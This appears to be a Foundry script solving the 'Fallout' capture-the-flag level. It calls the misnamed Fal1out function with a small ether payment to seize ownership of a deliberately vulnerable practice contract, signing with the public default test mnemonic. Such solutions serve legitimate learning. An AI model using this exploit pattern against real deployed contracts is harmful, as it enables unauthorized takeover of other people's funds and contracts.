// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import {Script} from "@forge-std/Script.sol";
import {Fallout} from "@main-0_6_x/2_Fallout.sol";


contract SolveFalloutScript is Script {

    Fallout falloutChallenge = Fallout( payable(address(0x8464135c8F25Da09e49BC8782676a84730C318bC)) );

    function run() public {
        // uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        // string memory mnemonic = vm.envString("MNEMONIC");

        // address is already funded with ETH
        string memory mnemonic ="test test test test test test test test test test test junk";
        uint256 deployerPrivateKey = vm.deriveKey(mnemonic, "m/44'/60'/0'/0/", 1); //  address = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8

        vm.startBroadcast(deployerPrivateKey);

        falloutChallenge.Fal1out{value: 0.0005 ether}();

        vm.stopBroadcast();
    }
}
